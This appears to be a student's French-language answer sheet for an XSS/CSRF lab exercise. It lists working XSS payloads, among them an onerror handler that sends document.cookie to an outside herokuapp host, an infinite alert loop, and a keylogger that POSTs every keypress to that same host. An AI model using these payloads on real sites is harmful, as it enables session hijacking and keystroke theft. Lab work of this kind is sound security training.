Partie 1 -
Level 1
https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%27dzqjidqi.jpg%27%20onerror=alert(%27test%27)%3E%3C/img%3E

Level 2
1 -
<img src='dqd.jpg' onerror= alert('xss') ></img> dans title

2 -
Le script ne fonctionne ne pas car il a été correctement géré coté serveur.

3 -
Les données sont récupérés grâce à un appel de l'API Fetch en JavaScript.

4 -
<img src='zzz.jpg' onerror=while(true)alert('xss') ></img>

5 -
<img src='zzz.jpg' onerror="var addr = 'https://my-malicious-ws-maisonhaute.herokuapp.com/' + document.cookie; var imgTag = document.createElement('img') ; imgTag.setAttribute('src', addr); document.body.appendChild(imgTag);" ></img>

Level 3
1 - 
On peut ajouter une balise script en rajoutant des majuscules à certaine lettre de la balise tel que
2 -
Avec la technique précédente, la balise est bien ajouter mais le code ne s'éxecute pas. Il doit y avoir une autre solution.
Pour le keylogger, il suffirait d'écrire ça dans la balise : 
document.addEventListener('keypress', (event) => {
	fetch('https://my-malicious-ws-maisonhaute.herokuapp.com/', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({keypressed: String.fromCharCode( event.which )})
	})
});


Partie 2
1 - J'ai pas d'amis :p
2 - J'ai pas d'amis :p
3 - J'ai pas d'amis :p
